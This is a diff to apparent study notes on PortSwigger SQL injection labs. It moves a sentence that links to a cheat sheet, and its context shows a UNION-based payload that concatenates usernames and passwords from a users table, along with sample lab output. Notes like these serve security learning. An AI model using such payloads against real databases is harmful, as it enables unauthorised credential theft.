@@ -93,9 +93,9 @@ wiener~peter
 carlos~montoya
 ...
 ```
-Different databases use different syntax to perform string concatenation. For more details, see the SQL injection [cheat sheet](https://github.com/DDarkDefender/Web-Applications/blob/main/PortSwigger/Injection%20(SQL%20and%20NoSQL)/SQL/CheatSheet.md).
 
 If you have only one string column, but the original query also returns other columns that are not string you can use the following example to structure your payload.
 ```
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 ```
+Different databases use different syntax to perform string concatenation. For more details, see the SQL injection [cheat sheet](https://github.com/DDarkDefender/Web-Applications/blob/main/PortSwigger/Injection%20(SQL%20and%20NoSQL)/SQL/CheatSheet.md).
